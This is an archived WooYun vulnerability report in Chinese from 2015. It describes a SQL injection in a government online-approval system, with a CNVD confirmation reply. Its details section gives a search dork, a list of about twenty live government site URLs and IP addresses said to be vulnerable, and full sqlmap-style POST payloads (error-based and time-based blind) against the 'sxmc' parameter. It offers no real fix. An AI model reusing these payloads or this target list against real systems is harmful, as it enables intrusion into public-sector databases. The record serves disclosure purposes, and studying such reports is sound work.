{"id": 34177, "wybug_id": "wooyun-2015-0107056", "wybug_title": "某政务系统一处通用SQL注入漏洞（附众多政务案例）", "wybug_corp": "邯郸市连邦软件发展有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-14 15:31", "wybug_open_date": "2015-07-16 11:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： 某政务系统一处通用SQL注入漏洞（附众多政务案例） 详细说明：  系统开发厂商：邯郸市连邦软件发展有限公司系统架构：ASPX+MSSQL漏洞文件：workplate/xzsp/tjfx/grbjtj/list.aspxsxmc参数过滤存在问题，导致注入关键字：inurl：workplate部分政府案例：日照市网上审批系统http://www.rzfwzx.gov.cn/workplate/xzsp/tjfx/grbjtj/list.aspx保定市网上审批系统http://www.bdxzfw.cn/workplate/xzsp/tjfx/grbjtj/list.aspx磁县网上审批系统http://www.cxxzfwzx.com/workplate/xzsp/tjfx/grbjtj/list.aspx魏县网上审批系统http://wxxz.gov.cn/workplate/xzsp/tjfx/grbjtj/list.aspx邯郸县网上审批系统http://www.hdxzwzx.com/workplate/xzsp/tjfx/grbjtj/list.aspx南郊区网上审批系统http://xz.njqsp.com:8001/workplate/xzsp/tjfx/grbjtj/list.aspx城区网上审批系统http://211.142.37.152:81/workplate/xzsp/tjfx/grbjtj/list.aspx左云县网上审批系统 http://211.142.37.152:88/workplate/xzsp/tjfx/grbjtj/list.aspx天镇县网上审批系统http://211.142.37.154:83/workplate/xzsp/tjfx/grbjtj/list.aspx广灵县网上审批系统 http://211.142.37.152:83/workplate/xzsp/tjfx/grbjtj/list.aspx新荣区网上审批系统http://183.203.128.238:82/workplate/xzsp/tjfx/grbjtj/list.aspx矿区网上审批系统http://211.142.41.114:82/workplate/xzsp/tjfx/grbjtj/list.aspx涉县网上审批系统http://www.hbsxxzfwzx.gov.cn/workplate/xzsp/tjfx/grbjtj/list.aspx临漳县网上审批系统http://www.lzxzfwzx.com/workplate/xzsp/tjfx/grbjtj/list.aspx安新县网上审批系统http://www.axxzfwzx.com/workplate/xzsp/tjfx/grbjtj/list.aspx高阳县网上审批系统http://gyxzfw.net/workplate/xzsp/tjfx/grbjtj/list.aspx长子县网上审批系统http://60.220.253.153:81/workplate/xzsp/tjfx/grbjtj/list.aspx屯留县网上审批系统http://60.220.240.7/workplate/xzsp/tjfx/grbjtj/list.aspx浑源县网上审批系统http://211.142.37.152:85/workplate/xzsp/tjfx/grbjtj/list.aspx邱县网上审批系统www.qxxzfwzx.com/workplate/xzsp/tjfx/grbjtj/list.aspx南郊区网上审批系统http://xz.njqsp.com:8001/workplate/xzsp/tjfx/grbjtj/list.aspx大同县网上审批系统http://211.142.37.152:82/workplate/xzsp/tjfx/grbjtj/list.aspx等等   漏洞证明：  漏洞验证：以http://www.rzfwzx.gov.cn/workplate/xzsp/tjfx/grbjtj/list.aspx为例：\n---Place: POSTParameter: sxmc    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwUKMTg0OTU1NTc4OA9kFgICAw9kFgICDw88KwANAQAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnQCB2QWAmYPZBYSAgEPD2QWBB4Lb25tb3VzZW92ZXIFHnRoaXMuY2xhc3NOYW1lPSdkdk9uTW91c2VPdmVyJx4Kb25tb3VzZW91dAUWdGhpcy5jbGFzc05hbWU9J2R2Um93JxYKZg8PFgIeBFRleHQFATFkZAIBDw8WAh8EBQnmib/or7rku7ZkZAICDw8WAh8EBQEwZGQCAw8PFgIfBAUBMGRkAgQPDxYCHwQFATBkZAICDw9kFgQfAgUedGhpcy5jbGFzc05hbWU9J2R2T25Nb3VzZU92ZXInHwMFF3RoaXMuY2xhc3NOYW1lPSdkdlJvdzInFgpmDw8WAh8EBQEyZGQCAQ8PFgIfBAUJ5Y2z5Yqe5Lu2ZGQCAg8PFgIfBAUBMGRkAgMPDxYCHwQFATBkZAIEDw8WAh8EBQEwZGQCAw8PZBYEHwIFHnRoaXMuY2xhc3NOYW1lPSdkdk9uTW91c2VPdmVyJx8DBRZ0aGlzLmNsYXNzTmFtZT0nZHZSb3cnFgpmDw8WAh8EBQEzZGQCAQ8PFgIfBAUJ6IGU5Yqe5Lu2ZGQCAg8PFgIfBAUBMGRkAgMPDxYCHwQFATBkZAIEDw8WAh8EBQEwZGQCBA8PZBYEHwIFHnRoaXMuY2xhc3NOYW1lPSdkdk9uTW91c2VPdmVyJx8DBRd0aGlzLmNsYXNzTmFtZT0nZHZSb3cyJxYKZg8PFgIfBAUBNGRkAgEPDxYCHwQFCeS4iuaKpeS7tmRkAgIPDxYCHwQFATBkZAIDDw8WAh8EBQEwZGQCBA8PFgIfBAUBMGRkAgUPD2QWBB8CBR50aGlzLmNsYXNzTmFtZT0nZHZPbk1vdXNlT3ZlcicfAwUWdGhpcy5jbGFzc05hbWU9J2R2Um93JxYKZg8PFgIfBAUBNWRkAgEPDxYCHwQFCeihpeWKnuS7tmRkAgIPDxYCHwQFATBkZAIDDw8WAh8EBQEwZGQCBA8PFgIfBAUBMGRkAgYPD2QWBB8CBR50aGlzLmNsYXNzTmFtZT0nZHZPbk1vdXNlT3ZlcicfAwUXdGhpcy5jbGFzc05hbWU9J2R2Um93MicWCmYPDxYCHwQFATZkZAIBDw8WAh8EBQnnibnlip7ku7ZkZAICDw8WAh8EBQEwZGQCAw8PFgIfBAUBMGRkAgQPDxYCHwQFATBkZAIHDw9kFgQfAgUedGhpcy5jbGFzc05hbWU9J2R2T25Nb3VzZU92ZXInHwMFFnRoaXMuY2xhc3NOYW1lPSdkdlJvdycWCmYPDxYCHwQFATdkZAIBDw8WAh8EBQblkIjorqFkZAICDw8WAh8EBQEwZGQCAw8PFgIfBAUBMGRkAgQPDxYCHwQFATBkZAIIDw8WAh4HVmlzaWJsZWhkZAIJDw8WAh8FaGQWAmYPZBYGAgEPDxYCHwQFATFkZAIDDw8WAh8EBQExZGQCDQ8PFgIfBAUBMWRkGAEFBmd2TGlzdA88KwAKAQgCAWRGZ7HIi9dZwX KnsTLvaQXbd867A==&__VIEWSTATEGENERATOR=D642731C&__EVENTVALIDATION=/wEWCAKn0bXBCALvn9qDDQKGuYDVAQKm1eh/AvKBgQgCy5yMGwKM54rGBgLWlM bAsEB5BUsQlzemyARJep7dQJuaFVP&tbhtml=&sxmc=%' AND 1886=CONVERT(INT,(CHAR(58) CHAR(107) CHAR(100) CHAR(118) CHAR(58) (SELECT (CASE WHEN (1886=1886) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(102) CHAR(98) CHAR(118) CHAR(58))) AND '%'='&iptStartAt=&iptEndAt=&P_STARTEND=&btn_search=%E6%9F%A5%E6%89%BE    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: __VIEWSTATE=/wEPDwUKMTg0OTU1NTc4OA9kFgICAw9kFgICDw88KwANAQAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnQCB2QWAmYPZBYSAgEPD2QWBB4Lb25tb3VzZW92ZXIFHnRoaXMuY2xhc3NOYW1lPSdkdk9uTW91c2VPdmVyJx4Kb25tb3VzZW91dAUWdGhpcy5jbGFzc05hbWU9J2R2Um93JxYKZg8PFgIeBFRleHQFATFkZAIBDw8WAh8EBQnmib/or7rku7ZkZAICDw8WAh8EBQEwZGQCAw8PFgIfBAUBMGRkAgQPDxYCHwQFATBkZAICDw9kFgQfAgUedGhpcy5jbGFzc05hbWU9J2R2T25Nb3VzZU92ZXInHwMFF3RoaXMuY2xhc3NOYW1lPSdkdlJvdzInFgpmDw8WAh8EBQEyZGQCAQ8PFgIfBAUJ5Y2z5Yqe5Lu2ZGQCAg8PFgIfBAUBMGRkAgMPDxYCHwQFATBkZAIEDw8WAh8EBQEwZGQCAw8PZBYEHwIFHnRoaXMuY2xhc3NOYW1lPSdkdk9uTW91c2VPdmVyJx8DBRZ0aGlzLmNsYXNzTmFtZT0nZHZSb3cnFgpmDw8WAh8EBQEzZGQCAQ8PFgIfBAUJ6IGU5Yqe5Lu2ZGQCAg8PFgIfBAUBMGRkAgMPDxYCHwQFATBkZAIEDw8WAh8EBQEwZGQCBA8PZBYEHwIFHnRoaXMuY2xhc3NOYW1lPSdkdk9uTW91c2VPdmVyJx8DBRd0aGlzLmNsYXNzTmFtZT0nZHZSb3cyJxYKZg8PFgIfBAUBNGRkAgEPDxYCHwQFCeS4iuaKpeS7tmRkAgIPDxYCHwQFATBkZAIDDw8WAh8EBQEwZGQCBA8PFgIfBAUBMGRkAgUPD2QWBB8CBR50aGlzLmNsYXNzTmFtZT0nZHZPbk1vdXNlT3ZlcicfAwUWdGhpcy5jbGFzc05hbWU9J2R2Um93JxYKZg8PFgIfBAUBNWRkAgEPDxYCHwQFCeihpeWKnuS7tmRkAgIPDxYCHwQFATBkZAIDDw8WAh8EBQEwZGQCBA8PFgIfBAUBMGRkAgYPD2QWBB8CBR50aGlzLmNsYXNzTmFtZT0nZHZPbk1vdXNlT3ZlcicfAwUXdGhpcy5jbGFzc05hbWU9J2R2Um93MicWCmYPDxYCHwQFATZkZAIBDw8WAh8EBQnnibnlip7ku7ZkZAICDw8WAh8EBQEwZGQCAw8PFgIfBAUBMGRkAgQPDxYCHwQFATBkZAIHDw9kFgQfAgUedGhpcy5jbGFzc05hbWU9J2R2T25Nb3VzZU92ZXInHwMFFnRoaXMuY2xhc3NOYW1lPSdkdlJvdycWCmYPDxYCHwQFATdkZAIBDw8WAh8EBQblkIjorqFkZAICDw8WAh8EBQEwZGQCAw8PFgIfBAUBMGRkAgQPDxYCHwQFATBkZAIIDw8WAh4HVmlzaWJsZWhkZAIJDw8WAh8FaGQWAmYPZBYGAgEPDxYCHwQFATFkZAIDDw8WAh8EBQExZGQCDQ8PFgIfBAUBMWRkGAEFBmd2TGlzdA88KwAKAQgCAWRGZ7HIi9dZwX KnsTLvaQXbd867A==&__VIEWSTATEGENERATOR=D642731C&__EVENTVALIDATION=/wEWCAKn0bXBCALvn9qDDQKGuYDVAQKm1eh/AvKBgQgCy5yMGwKM54rGBgLWlM bAsEB5BUsQlzemyARJep7dQJuaFVP&tbhtml=&sxmc=%' AND 1640=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND '%'='&iptStartAt=&iptEndAt=&P_STARTEND=&btn_search=%E6%9F%A5%E6%89%BE---\n\n\n当前数据库信息：\n\n其他如上！   修复方案：  如上所述！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-04-17 11:00 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商及对应分中心通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}